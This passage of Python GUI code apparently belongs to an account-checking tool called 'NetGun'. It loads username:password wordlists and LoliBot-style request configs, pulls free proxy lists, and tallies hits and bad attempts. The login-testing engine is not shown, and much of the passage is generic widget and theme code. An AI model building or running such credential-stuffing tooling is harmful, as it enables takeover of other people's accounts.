            button_1.configure(text=f"Wordlist: {usrcwd}")

            self.userlistX = userlist

        def import_loli():

            try:     
                userlist = filedialog.askopenfilename()  
                with open(userlist, 'r', encoding='utf-8') as f:
                    fulltxt = f.read()
                
                self.LoliScript.delete("0.0", "end")
                self.LoliScript.insert("0.0", fulltxt)

            except Exception:
                return

            usrcwdtmp2 = userlist.replace('\\', '/')
            usrcwdtmp =  usrcwdtmp2.split('/')
            # for xd in usrcwdtmp:
            LenCwd = len(usrcwdtmp) - 1
            usrcwd = usrcwdtmp[LenCwd]
            button_2.configure(text=f"Config: {usrcwd}")

        def get_proxies(endpoint):
            try:
                response = requests.get(endpoint, timeout=10).text
            except Exception as err:
                return consolelog('INFO', err)
                

            if any(char.isalpha() for char in response):
                pass
            else:
                for line in response:
                    line = line.replace('\n', '')
                    with open('tmp/NetGun_http.txt', 'a', encoding="utf-8") as f:
                        f.write(line)

        menu = CTkMenuBar(self)
        button_1 = menu.add_cascade("Wordlist: None", command=import_Wrdlst)
        button_2 = menu.add_cascade("Config: None", command=import_loli)

        config_text = r"""REQUEST GET "https://google.com" 
            HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
            HEADER "Pragma: no-cache" 
            HEADER "Accept: */*" 

            KEYCHECK 
              KEYCHAIN Success OR 
                KEY "title>Google" """

        self.loliTxt = customtkinter.CTkLabel(master=self, text="LOLI SCRIPT")
        self.loliTxt.place(relx=0.2, rely=0.1, anchor=customtkinter.CENTER)

        self.LoliScript = customtkinter.CTkTextbox(self, corner_radius=10, height=450, width=450, fg_color="black")
        self.LoliScript.place(relx=0.2, rely=0.5, anchor=customtkinter.CENTER)
        self.LoliScript.insert("0.0", config_text)

        self.DebugBox = customtkinter.CTkTextbox(self, corner_radius=10, height=450, width=450, fg_color="black")
        self.DebugBox.place(relx=0.2, rely=1.5, anchor=customtkinter.CENTER)
        self.DebugBox.insert("0.0", "Idle")

        self.res_frame = customtkinter.CTkScrollableFrame(self, label_text="Result", width=200, height=300)
        self.res_frame.place(relx=0.86, rely=0.5, anchor=customtkinter.CENTER)
        self.res_frame_switches = []

        self.TotalBox = customtkinter.CTkLabel(self.res_frame, text_color="white", text='Total: 0')
        self.TotalBox.pack()
        self.res_frame_switches.append(self.TotalBox)

        self.HitsBox = customtkinter.CTkLabel(self.res_frame, text_color="green", text='Hits: 0')
        self.HitsBox.pack()
        self.res_frame_switches.append(self.HitsBox)

        self.customBox = customtkinter.CTkLabel(self.res_frame, text_color="orange", text='Custom: 0')
        self.customBox.pack()
        self.res_frame_switches.append(self.customBox)

        self.BadBox = customtkinter.CTkLabel(self.res_frame, text_color="red", text='Bad: 0')
        self.BadBox.pack()
        self.res_frame_switches.append(self.BadBox)

        self.RetriesBox = customtkinter.CTkLabel(self.res_frame, text_color="yellow", text='Retries: 0')
        self.RetriesBox.pack()
        self.res_frame_switches.append(self.RetriesBox)

        # self.SetupTxt = customtkinter.CTkLabel(master=self, text="SETUP")
        # self.SetupTxt.place(relx=0.6, rely=0.1, anchor=customtkinter.CENTER)

        def debug_winV2(x6x):
            self.LoliScript.place(relx=0.2, rely=0.5, anchor=customtkinter.CENTER)
            self.DebugBox.place(relx=0.2, rely=1.5, anchor=customtkinter.CENTER)
            self.NetGun_debugBtn.bind("<Button-1>", lambda e:debug_winV1('x8x'))
            self.loliTxt.configure(text="Loli Script")

        def debug_winV1(x6x):
            self.LoliScript.place(relx=0.2, rely=1.5, anchor=customtkinter.CENTER)
            self.DebugBox.place(relx=0.2, rely=0.5, anchor=customtkinter.CENTER)
            self.NetGun_debugBtn.bind("<Button-1>", lambda e:debug_winV2('x8x'))
            self.loliTxt.configure(text="Debug log")

        def open_rfolder(x6x):
            directory = os.getcwd()
            res_folder = f'{directory}/Result/NetGun'
            os.startfile(res_folder)

        self.NetGun_debugBtn = customtkinter.CTkLabel(self, image=debug_icon, text='')
        self.NetGun_debugBtn.place(relx=0.97, rely=0.5, anchor=customtkinter.CENTER)
        self.NetGun_debugBtn.bind("<Button-1>", lambda e:debug_winV1('x8x'))

        self.NetGun_ResultBtn = customtkinter.CTkLabel(self, image=folder_icon, text='')
        self.NetGun_ResultBtn.place(relx=0.97, rely=0.43, anchor=customtkinter.CENTER)
        self.NetGun_ResultBtn.bind("<Button-1>", lambda e:open_rfolder('x8x'))

        self.ScrollFrame = customtkinter.CTkScrollableFrame(self, corner_radius=10, height=430, width=440, fg_color="black")
        self.ScrollFrame.place(relx=0.6, rely=0.5, anchor=customtkinter.CENTER)
        self.ScrollFrame_frame = []

        def proxiesVar(choice):

            self.CoolWaitStop2 = False

            if choice == 'Import':
                msg = CTkMessagebox(title="Type?", message="proxies type?", icon="question", option_1="HTTP", option_2="SOCKS4", option_3="SOCKS5")
                response = msg.get()
                
                if response=="HTTP" or response=="SOCKS4" or response=="SOCKS5":
                    ProxiesProtocol = response

                    usrpath = filedialog.askopenfilename(filetypes=[("txt file", ".txt")])
                    
                    shutil.copyfile(usrpath, 'tmp/NetGun_Custom.txt')
                    with open('tmp/NetGun_Custom.txt', 'r', encoding="utf-8") as f:
                        self.NetGunProxies = list(f)

                    self.Txt0x.configure(text=f"Proxies: Custom[{len(self.NetGunProxies)}]")

            elif choice == 'Free Proxies':
                try:
                    os.remove('tmp/NetGun_http.txt')      
                except:
                    pass

                def coolwait2():

                    self.Txt0x.configure(text=f'please wait')
                    time.sleep(0.5)
                    self.Txt0x.configure(text=f'please wait.')
                    time.sleep(0.5)
                    self.Txt0x.configure(text=f'please wait..')
                    time.sleep(0.5)
                    self.Txt0x.configure(text=f'please wait...')

                    if self.CoolWaitStop2 == True:
                        self.Txt0x.configure(text=f"Proxies: Free[{len(self.NetGunProxies)}]")
                    else:
                        coolwait2()

                bot = threading.Thread(target=coolwait2)
                bot.daemon = True
                bot.start()

                # console.log(type="INFO", text="Grabbing HTTP... 1/2")          
                get_proxies('http://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all')
                # console.log(type="INFO", text="Grabbing HTTP... 2/2")
                get_proxies('http://www.proxyscan.io/download?type=http')
                

                with open('tmp/NetGun_http.txt', 'r', encoding="utf-8") as f:
                    self.NetGunProxies = list(f)

                self.CoolWaitStop2 = True

            if choice == 'No Proxies':
                try:
                    os.remove('tmp/NetGun_http.txt')
                except:
                    pass

                self.Txt0x.configure(text=f"Proxies: No[0]")

        def proxiesVar_trig(choice):
            bot = threading.Thread(target=proxiesVar, args=(choice,))
            bot.daemon = True
            bot.start()

        self.Txt0x = customtkinter.CTkLabel(master=self.ScrollFrame, text="Proxies: No[0]")
        self.Txt0x.pack()
        self.ScrollFrame_frame.append(self.Txt0x)
        self.netGun_proxies = customtkinter.CTkComboBox(master=self.ScrollFrame, fg_color="red", text_color="black", values=["No Proxies", "Free Proxies", "Import"], width=110, command=proxiesVar_trig)
        self.netGun_proxies.pack()
        self.ScrollFrame_frame.append(self.netGun_proxies)

        self.Txt1x = customtkinter.CTkLabel(master=self.ScrollFrame, text="Mode: <USER>:<PASS>")
        self.Txt1x.pack()
        self.ScrollFrame_frame.append(self.Txt1x)
        self.netGun_MODE = customtkinter.CTkComboBox(master=self.ScrollFrame, fg_color="red", text_color="black", values=["<USER>:<PASS>"], width=110)
        self.netGun_MODE.pack()
        self.ScrollFrame_frame.append(self.netGun_MODE)

        self.Txt2x = customtkinter.CTkLabel(master=self.ScrollFrame, text="DATA")
        self.Txt2x.pack()
        self.ScrollFrame_frame.append(self.Txt2x)
        prot = customtkinter.StringVar(value="test:pwd")
        self.data_entry = customtkinter.CTkEntry(self.ScrollFrame, width=300, fg_color="transparent", textvariable=prot, height=30)
        self.data_entry.pack()
        self.ScrollFrame_frame.append(self.data_entry)

        self.TestItBtn = customtkinter.CTkButton(master=self, text="Test it", state="normal")
        self.TestItBtn.place(relx=0.95, rely=0.9, anchor=customtkinter.CENTER)
        self.StartBtn = customtkinter.CTkButton(master=self, text="Start", state="normal")
        self.StartBtn.place(relx=0.95, rely=0.95, anchor=customtkinter.CENTER)

class CTkMessagebox(customtkinter.CTkToplevel):
    
    def __init__(self,
                 master: any = None,
                 width: int = 400,
                 height: int = 200,
                 title: str = "CTkMessagebox",
                 message: str = "This is a CTkMessagebox!",
                 option_1: str = "OK",
                 option_2: str = None,
                 option_3: str = None,
                 options: list = [],
                 border_width: int = 1,
                 border_color: str = "default",
                 button_color: str = "default",
                 bg_color: str = "default",
                 fg_color: str = "default",
                 text_color: str = "default",
                 title_color: str = "default",
                 button_text_color: str = "default",
                 button_width: int = None,
                 button_height: int = None,
                 cancel_button_color: str = None,
                 cancel_button: str = "circle", # types: circle, cross or none
                 button_hover_color: str = "default",
                 icon: str = "info",
                 icon_size: tuple = None,
                 corner_radius: int = 15,
                 font: tuple = None,
                 header: bool = False,
                 topmost: bool = True,
                 fade_in_duration: int = 0):
        
        super().__init__()

        self.master_window = master
        self.width = 250 if width<250 else width
        self.height = 150 if height<150 else  height
            
        if self.master_window is None:
            self.spawn_x = int((self.winfo_screenwidth()-self.width)/2)
            self.spawn_y = int((self.winfo_screenheight()-self.height)/2)
        else:
            self.spawn_x = int(self.master_window.winfo_width() * .5 + self.master_window.winfo_x() - .5 * self.width + 7)
            self.spawn_y = int(self.master_window.winfo_height() * .5 + self.master_window.winfo_y() - .5 * self.height + 20)
            
        self.after(10)
        self.geometry(f"{self.width}x{self.height}+{self.spawn_x}+{self.spawn_y}")
        self.attributes("-topmost", True)
        self.title(title)
        self.resizable(width=False, height=False)
        self.fade = fade_in_duration
        
        if self.fade:
            self.fade = 20 if self.fade<20 else self.fade
            self.attributes("-alpha", 0)
            
        if not header:
            self.overrideredirect(1)
    
        # if topmost:
        #     self.attributes("-topmost", True)
        # else:
        #     self.transient(self.master_window)
    
        if sys.platform.startswith("win"):
            self.transparent_color = 'black'
            # self.transparent_color = self._apply_appearance_mode(self._fg_color)
            #self.attributes("-transparentcolor", self.transparent_color)
           
        elif sys.platform.startswith("darwin"):
            self.transparent_color = 'black'
            #self.attributes("-transparent", True)
        else:
            self.transparent_color = 'black'
            corner_radius = 0
        
        corner_radius = 0
        self.lift()
        self.config(background=self.transparent_color)
        self.protocol("WM_DELETE_WINDOW", self.button_event)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)    
        self.x = self.winfo_x()
        self.y = self.winfo_y()
        self._title = title
        self.message = message
        self.font = font
        self.cancel_button = cancel_button
        self.round_corners = corner_radius if corner_radius<=30 else 30
        self.button_width = button_width if button_width else self.width/4
        self.button_height = button_height if button_height else 28
        if self.fade: self.attributes("-alpha", 0)
        
        if self.button_height>self.height/4: self.button_height = self.height/4 -20
        self.dot_color = cancel_button_color
        self.border_width = border_width if border_width<6 else 5
        
        if type(options) is list and len(options)>0:
            try:
                option_1 = options[-1]
                option_2 = options[-2]
                option_3 = options[-3]
            except IndexError: None
            
        if bg_color=="default":
            self.bg_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkFrame"]["fg_color"])
        else:
            self.bg_color = bg_color

        if fg_color=="default":
            self.fg_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkFrame"]["top_fg_color"])
        else:
            self.fg_color = fg_color

        default_button_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkButton"]["fg_color"])
        
        if button_color=="default":
            self.button_color = (default_button_color, default_button_color, default_button_color)
        else:
            if type(button_color) is tuple:
                if len(button_color)==2:                
                    self.button_color = (button_color[0], button_color[1], default_button_color)
                elif len(button_color)==1:
                    self.button_color = (button_color[0], default_button_color, default_button_color)
                else:
                    self.button_color = button_color
            else:
                self.button_color = (button_color, button_color, button_color)

        if text_color=="default":
            self.text_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkLabel"]["text_color"])
        else:
            self.text_color = text_color

        if title_color=="default":
            self.title_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkLabel"]["text_color"])
        else:
            self.title_color = title_color
            
        if button_text_color=="default":
            self.bt_text_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkButton"]["text_color"])
        else:
            self.bt_text_color = button_text_color

        if button_hover_color=="default":
            self.bt_hv_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkButton"]["hover_color"])
        else:
            self.bt_hv_color = button_hover_color
            
        if border_color=="default":
            self.border_color = self._apply_appearance_mode(customtkinter.ThemeManager.theme["CTkFrame"]["border_color"])
        else:
            self.border_color = border_color
            
        if icon_size:
            self.size_height = icon_size[1] if icon_size[1]<=self.height-100 else self.height-100
            self.size = (icon_size[0], self.size_height)
        else:
            self.size = (self.height/4, self.height/4)
        
        if icon in ["check", "cancel", "info", "question", "warning"]:
            self.icon = customtkinter.CTkImage(Image.open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'core/icons', icon+'.png')),
                                               size=self.size)
        else:
            self.icon = customtkinter.CTkImage(Image.open(icon), size=self.size) if icon else None

        self.frame_top = customtkinter.CTkFrame(self, corner_radius=self.round_corners, width=self.width, border_width=self.border_width,
                                                bg_color=self.transparent_color, fg_color=self.bg_color, border_color=self.border_color)
        self.frame_top.grid(sticky="nswe")

        if button_width:
            self.frame_top.grid_columnconfigure(0, weight=1)
        else:
            self.frame_top.grid_columnconfigure((1,2,3), weight=1)

        if button_height:
            self.frame_top.grid_rowconfigure((0,1,3), weight=1)
        else:
            self.frame_top.grid_rowconfigure((0,1,2), weight=1)
            
        self.frame_top.bind("<B1-Motion>", self.move_window)
        self.frame_top.bind("<ButtonPress-1>", self.oldxyset)

        if self.cancel_button=="cross":
            self.button_close = customtkinter.CTkButton(self.frame_top, corner_radius=10, width=0, height=0, hover=False,
                                                        text_color=self.dot_color if self.dot_color else self.title_color,
                                                        text="✕", fg_color="transparent", command=self.button_event)
            self.button_close.grid(row=0, column=3, sticky="ne", padx=5+self.border_width, pady=5+self.border_width)
            self.button_close.configure(cursor="arrow")
        elif self.cancel_button=="circle":
            self.button_close = customtkinter.CTkButton(self.frame_top, corner_radius=10, width=10, height=10, hover=False,
                                                        text="", fg_color=self.dot_color if self.dot_color else "#c42b1c", command=self.button_event)     
            self.button_close.grid(row=0, column=3, sticky="ne", padx=10, pady=10)       
            self.button_close.configure(cursor="arrow")
            
        self.title_label = customtkinter.CTkLabel(self.frame_top, width=1, text=self._title, text_color=self.title_color, font=self.font)
        self.title_label.grid(row=0, column=0, columnspan=4, sticky="nw", padx=(15,30), pady=5)
        self.title_label.bind("<B1-Motion>", self.move_window)
        self.title_label.bind("<ButtonPress-1>", self.oldxyset)
        
        self.info = customtkinter.CTkButton(self.frame_top,  width=1, height=self.height/2, corner_radius=0, text=self.message, font=self.font,
                                            fg_color=self.fg_color, hover=False, text_color=self.text_color, image=self.icon)
        self.info._text_label.configure(wraplength=self.width/2, justify="left")
        self.info.grid(row=1, column=0, columnspan=4, sticky="nwes", padx=self.border_width)
        
        if self.info._text_label.winfo_reqheight()>self.height/2:
            height_offset = int((self.info._text_label.winfo_reqheight())-(self.height/2) + self.height)
            self.geometry(f"{self.width}x{height_offset}")
            
        self.option_text_1 = option_1
        self.button_1 = customtkinter.CTkButton(self.frame_top, text=self.option_text_1, fg_color=self.button_color[0],
                                                width=self.button_width, font=self.font, text_color=self.bt_text_color,
                                                hover_color=self.bt_hv_color, height=self.button_height,
                                                command=lambda: self.button_event(self.option_text_1))
        
        self.button_1.grid(row=2, column=3, sticky="news", padx=(0,10), pady=10)

        if option_2:
            self.option_text_2 = option_2      
            self.button_2 = customtkinter.CTkButton(self.frame_top, text=self.option_text_2, fg_color=self.button_color[1],
                                                    width=self.button_width, font=self.font, text_color=self.bt_text_color,
                                                    hover_color=self.bt_hv_color, height=self.button_height,
                                                    command=lambda: self.button_event(self.option_text_2))
            self.button_2.grid(row=2, column=2, sticky="news", padx=10, pady=10)
            
        if option_3:
            self.option_text_3 = option_3
            self.button_3 = customtkinter.CTkButton(self.frame_top, text=self.option_text_3, fg_color=self.button_color[2],
                                                    width=self.button_width, font=self.font, text_color=self.bt_text_color,
                                                    hover_color=self.bt_hv_color, height=self.button_height,
                                                    command=lambda: self.button_event(self.option_text_3))
            self.button_3.grid(row=2, column=1, sticky="news", padx=(10,0), pady=10)

        if header:
            self.title_label.grid_forget()
            self.button_close.grid_forget()
            self.frame_top.configure(corner_radius=0)

        if self.winfo_exists():
            self.grab_set()
            
        if self.fade:
            self.fade_in()
        
    def fade_in(self):
        for i in range(0,110,10):
            if not self.winfo_exists():
                break
            self.attributes("-alpha", i/100)
            self.update()
            time.sleep(1/self.fade)
            
    def fade_out(self):
        for i in range(100,0,-10):
            if not self.winfo_exists():
                break
            self.attributes("-alpha", i/100)
            self.update()
            time.sleep(1/self.fade)

    def get(self):
        if self.winfo_exists():
            self.master.wait_window(self)
        return self.event
        
    def oldxyset(self, event):
        self.oldx = event.x
        self.oldy = event.y
    
    def move_window(self, event):
        self.y = event.y_root - self.oldy
        self.x = event.x_root - self.oldx
        self.geometry(f'+{self.x}+{self.y}')
        
    def button_event(self, event=None):
        try:
            self.button_1.configure(state="disabled")
            self.button_2.configure(state="disabled")
            self.button_3.configure(state="disabled")
        except AttributeError:
            pass

        if self.fade:
            self.fade_out()
        self.grab_release()
        self.destroy()
        self.event = event

class CTkListbox(customtkinter.CTkScrollableFrame):

    def __init__(self,
                 master: any,
                 height: int = 100,
                 width: int = 200,
                 hightlight_color: str = "default",
                 fg_color: str = None,
                 bg_color: str = None,
                 text_color: str = "default",
                 select_color: str = "default",
                 hover_color: str = "default",
                 border_width: int = 3,
                 font: tuple = "default",
                 multiple_selection: bool = False,
                 hover: bool = True,
                 command = None,
                 **kwargs):
        
        super().__init__(master, width=width, height=height, fg_color="red", border_width=border_width, **kwargs)
        self._scrollbar.grid_configure(padx=(0,border_width))
        self._scrollbar.configure(width=12)
        
        if bg_color:
            super().configure(bg_color=bg_color)

        self.select_color = customtkinter.ThemeManager.theme["CTkButton"]["fg_color"] if select_color=="default" else select_color
        self.text_color = customtkinter.ThemeManager.theme["CTkButton"]["text_color"] if text_color=="default" else text_color
        self.hover_color = customtkinter.ThemeManager.theme["CTkButton"]["hover_color"] if hover_color=="default" else hover_color
        self.font = (customtkinter.ThemeManager.theme["CTkFont"]["family"],13) if font=="default" else font
        self.buttons = {}
        self.command = command
        self.multiple = multiple_selection
        self.selected = None
        self.hover = hover
        self.selections = []
    
    def select(self, index):
        """ select the option """
        for options in self.buttons.values():
            options.configure(fg_color="transparent")
        
        if self.multiple:
            if self.buttons[index] in self.selections:
                self.selections.remove(self.buttons[index])
                self.buttons[index].configure(fg_color="transparent", hover=False)
                self.after(100, lambda: self.buttons[index].configure(hover=self.hover))
            else:
                self.selections.append(self.buttons[index])
            for i in self.selections:
                i.configure(fg_color=self.select_color, hover=False)
                self.after(100, lambda button=i: button.configure(hover=self.hover))
        else:
            self.selected = self.buttons[index]
            self.buttons[index].configure(fg_color=self.select_color, hover=False)
            self.after(100, lambda: self.buttons[index].configure(hover=self.hover))
            
        if self.command:
            self.command(self.get())
            
    def deselect(self, index):
        if not self.multiple:
            self.selected.configure(fg_color="transparent")
            self.selected = None
            return
        if self.buttons[index] in self.selections:
            self.selections.remove(self.buttons[index])
            self.buttons[index].configure(fg_color="transparent")
       
    def insert(self, index, option, justify="left", **args):
        """ select new value in the listbox """
        if justify=="left":
            justify = "w"
        elif justify=="right":
            justify = "e"
        else:
            justify = "c"
            
        if index in self.buttons:
            if index!="END":
                self.delete(index)
            
        self.buttons[index] = customtkinter.CTkButton(self, text=option, fg_color="transparent", anchor=justify,
                                                      text_color=self.text_color, font=self.font,
                                                      hover_color=self.hover_color, **args)
        self.buttons[index].configure(command=lambda num=index: self.select(num))
        self.buttons[index].pack(padx=0, pady=(0,5), fill="x", expand=True)

    def delete(self, index):
        """ delete a value from the listbox """
        self.buttons[index].destroy()
        del self.buttons[index]
        
    def size(self):
        """ return total number of items in the listbox """
        return len(self.buttons.values())

    def get(self, index=None):
        """ get the selected value """
        if index:
            if index=="ALL":
                return self.buttons[index].cget("text")
            else:
                return list(item.cget("text") for item in self.buttons.values())
        else:
            if self.multiple:
                return [x.cget("text") for x in self.selections] if len(self.selections)>0 else None
            else:
                return self.selected.cget("text") if self.selected is not None else None
        
    def configure(self, **kwargs):
        """ configurable options of the listbox """
        
        if "hover_color" in kwargs:
            self.hover_color = kwargs.pop("hover_color")
            for i in self.buttons.values():
                i.configure(hover_color=self.hover_color)
        if "highlight_color" in kwargs:
            self.select_color = kwargs.pop("highlight_color")
            if self.selected: self.selected.configure(fg_color=self.select_color)
            if len(self.selections)>0:
                for i in self.selections:
                    i.configure(fg_color=self.select_color)
        if "text_color" in kwargs:
            self.text_color = kwargs.pop("text_color")
            for i in self.buttons.values():
                i.configure(text=self.text_color)
        if "font" in kwargs:
            self.font = kwargs.pop("font")
            for i in self.buttons.values():
                i.configure(font=self.font)

        super().configure(**kwargs)

class ThemeMaker(customtkinter.CTkToplevel):
    #--------------------Main Structure of the Theme File--------------------# 
    json_data = {
    "CTk": {
      "fg_color": [
        "#ffffff",
        "#202020"
      ]
    },
    "CTkToplevel": {
      "fg_color": [
        "#c0c0c0",
        "#202020"
      ]
    },
    "CTkFrame": {
      "corner_radius": 6,
      "border_width": 0,
      "fg_color": [
        "#202020",
        "#ff0000"
      ],
      "top_fg_color": [
        "#ffffff",
        "black"
      ],
      "border_color": [
        "#ff0000",
        "#00ff00"
      ]
    },
    "CTkButton": {
      "corner_radius": 6,
      "border_width": 0,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "hover_color": [
        "#00ff00",
        "#00ff00"
      ],
      "border_color": [
        "#00ff00",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ],
      "text_color_disabled": [
        "gray74",
        "gray60"
      ]
    },
    "CTkLabel": {
      "corner_radius": 0,
      "fg_color": [
        "#000000",
        "#ff0000"
      ],
      "text_color": [
        "#ff0000",
        "#ffffff"
      ]
    },
    "CTkEntry": {
      "corner_radius": 6,
      "border_width": 2,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "border_color": [
        "#ff0000",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ],
      "placeholder_text_color": [
        "#ffff00",
        "#ffff00"
      ]
    },
    "CTkCheckBox": {
      "corner_radius": 6,
      "border_width": 3,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "border_color": [
        "#00ff00",
        "#00ff00"
      ],
      "hover_color": [
        "#00ff00",
        "#00ff00"
      ],
      "checkmark_color": [
        "#00ff00",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ],
      "text_color_disabled": [
        "gray60",
        "gray45"
      ]
    },
    "CTkSwitch": {
      "corner_radius": 1000,
      "border_width": 3,
      "button_length": 0,
      "fg_color": [
        "#ff0000",
        "#c61818"
      ],
      "progress_color": [
        "#00ff00",
        "#00ff00"
      ],
      "button_color": [
        "gray36",
        "#D5D9DE"
      ],
      "button_hover_color": [
        "gray20",
        "gray100"
      ],
      "text_color": [
        "#ffffff",
        "#000000"
      ],
      "text_color_disabled": [
        "gray60",
        "gray45"
      ]
    },
    "CTkRadioButton": {
      "corner_radius": 1000,
      "border_width_checked": 6,
      "border_width_unchecked": 3,
      "fg_color": [
        "#3B8ED0",
        "#1F6AA5"
      ],
      "border_color": [
        "#3E454A",
        "#949A9F"
      ],
      "hover_color": [
        "#36719F",
        "#144870"
      ],
      "text_color": [
        "gray10",
        "#DCE4EE"
      ],
      "text_color_disabled": [
        "gray60",
        "gray45"
      ]
    },
    "CTkProgressBar": {
      "corner_radius": 1000,
      "border_width": 0,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "progress_color": [
        "#2CC985",
        "#2FA572"
      ],
      "border_color": [
        "gray",
        "gray"
      ]
    },
    "CTkSlider": {
      "corner_radius": 1000,
      "button_corner_radius": 1000,
      "border_width": 6,
      "button_length": 0,
      "fg_color": [
        "#939BA2",
        "#4A4D50"
      ],
      "progress_color": [
        "gray40",
        "#AAB0B5"
      ],
      "button_color": [
        "#ff0000",
        "#ff0000"
      ],
      "button_hover_color": [
        "#00ff00",
        "#00ff00"
      ]
    },
    "CTkOptionMenu": {
      "corner_radius": 6,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "button_color": [
        "#ff0000",
        "#ff0000"
      ],
      "button_hover_color": [
        "#00ff00",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ],
      "text_color_disabled": [
        "gray74",
        "gray60"
      ]
    },
    "CTkComboBox": {
      "corner_radius": 6,
      "border_width": 2,
      "fg_color": [
        "#ff0000",
        "#ff0000"
      ],
      "border_color": [
        "#979DA2",
        "#565B5E"
      ],
      "button_color": [
        "#ff0000",
        "#ff0000"
      ],
      "button_hover_color": [
        "#00ff00",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ],
      "text_color_disabled": [
        "gray50",
        "gray45"
      ]
    },
    "CTkScrollbar": {
      "corner_radius": 1000,
      "border_spacing": 4,
      "fg_color": "transparent",
      "button_color": [
        "#ff0000",
        "#ff0000"
      ],
      "button_hover_color": [
        "#00ff00",
        "#00ff00"
      ]
    },
    "CTkSegmentedButton": {
      "corner_radius": 6,
      "border_width": 2,
      "fg_color": [
        "#979DA2",
        "gray29"
      ],
      "selected_color": [
        "#3B8ED0",
        "#1F6AA5"
      ],
      "selected_hover_color": [
        "#36719F",
        "#144870"
      ],
      "unselected_color": [
        "#979DA2",
        "gray29"
      ],
      "unselected_hover_color": [
        "gray70",
        "gray41"
      ],
      "text_color": [
        "#DCE4EE",
        "#DCE4EE"
      ],
      "text_color_disabled": [
        "gray74",
        "gray60"
      ]
    },
    "CTkTextbox": {
      "corner_radius": 6,
      "border_width": 0,
      "fg_color": [
        "#F9F9FA",
        "#1D1E1E"
      ],
      "border_color": [
        "#979DA2",
        "#565B5E"
      ],
      "text_color": [
        "gray10",
        "#DCE4EE"
      ],
      "scrollbar_button_color": [
        "#ff0000",
        "#ff0000"
      ],
      "scrollbar_button_hover_color": [
        "#00ff00",
        "#00ff00"
      ]
    },
    "CTkScrollableFrame": {
      "label_fg_color": [
        "#000000",
        "#000000"
      ]
    },
    "DropdownMenu": {
      "fg_color": [
        "gray90",
        "gray20"
      ],
      "hover_color": [
        "#00ff00",
        "#00ff00"
      ],
      "text_color": [
        "#000000",
        "#000000"
      ]
    },
    "CTkFont": {
      "macOS": {
        "family": "SF Display",
        "size": 13,
        "weight": "normal"
      },
      "Windows": {
        "family": "Roboto",
        "size": 13,
        "weight": "normal"
      },
      "Linux": {
        "family": "Roboto",
        "size": 13,
        "weight": "normal"
      }
    }
    }
  
    #--------------------Widget Type and Content--------------------#
    widgets = {'CTk':['fg_color'],
           'CTkToplevel':['fg_color'],
           'CTkFrame':['fg_color', 'top_fg_color', 'border_color'],
           'CTkButton':['fg_color','hover_color','border_color','text_color','text_color_disabled'],
           'CTkCheckBox':["fg_color", "border_color", "hover_color","checkmark_color", "text_color",
                          "text_color_disabled"],
           'CTkEntry':['fg_color','text_color','border_color','placeholder_text_color'],
           'CTkLabel':['fg_color', 'text_color'], 
           'CTkProgressBar':['fg_color','progress_color','border_color'],
           'CTkSlider':["fg_color", "progress_color", "button_color", "button_hover_color"],
           'CTkSwitch':["fg_Color", "progress_color", "button_color", "button_hover_color",
                        "text_color", "text_color_disabled"],
           'CTkOptionMenu':["fg_color", "button_color", "button_hover_color","text_color",
                            "text_color_disabled"],
           'CTkComboBox':["fg_color", "border_color", "button_color", "button_hover_color",
                          "text_color", "text_color_disabled"],
           'CTkScrollbar':["fg_color", "button_color", "button_hover_color"],
           'CTkRadioButton':["fg_color", "border_color", "hover_color", "text_color", "text_color_disabled"],
           'CTkTextbox':["fg_color", "border_color", "text_color", "scrollbar_button_color",
                         "scrollbar_button_hover_color"],
           'CTkSegmentedButton':["fg_color", "selected_color", "selected_hover_color", "unselected_color",
                                 "unselected_hover_color", "text_color", "text_color_disabled"],
           'CTkScrollableFrame':["label_fg_color"],
           'DropdownMenu':["fg_color", "hover_color", "text_color"]}

    widgetlist = [key for key in widgets] 
    current = widgetlist[0]

    for i in json_data:
        for key, value in json_data.get(i).items():
            if value=="transparent":
                json_data[i][key] = ["transparent", "transparent"]
                           
    def __init__(self, hide: int = None,):

        
        #--------------------Main root Window--------------------#
        super().__init__()
        customtkinter.set_default_color_theme("red")
        self.title("Theme Maker")
        self.geometry("500x450")
        self.attributes("-topmost", True)

        if hide == 1:
            self.withdraw()
        else:
            self.deiconify()

        #self.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.grid_columnconfigure((0,1,2,3,4,5), weight=1)
        self.grid_rowconfigure(2, weight=1)
        
        self.frame_info = customtkinter.CTkFrame(master=self, height=80)
        self.frame_info.grid(row=0, column=0, columnspan=6, sticky="nswe", padx=20, pady=20)
        self.frame_info.grid_columnconfigure(0, weight=1)

        self.widget_type = customtkinter.CTkLabel(master=self.frame_info, text=self.current, corner_radius=10, width=200, height=20,
                                        fg_color=("white", "gray38"))
        self.widget_type.grid(row=0, column=0, sticky="nswe", padx=80, pady=20)

        self.left_button = customtkinter.CTkButton(master=self.frame_info, text="<", width=20, height=20, corner_radius=10,
                                        fg_color=("white", "gray38"), command=self.change_mode_left)
        self.left_button.grid(row=0, column=0, sticky="nsw", padx=20, pady=20)

        self.right_button = customtkinter.CTkButton(master=self.frame_info, text=">", width=20, height=20, corner_radius=10,
                                        fg_color=("white", "gray38"), command=self.change_mode_right)
        self.right_button.grid(row=0, column=0, sticky="nse", padx=20, pady=20)

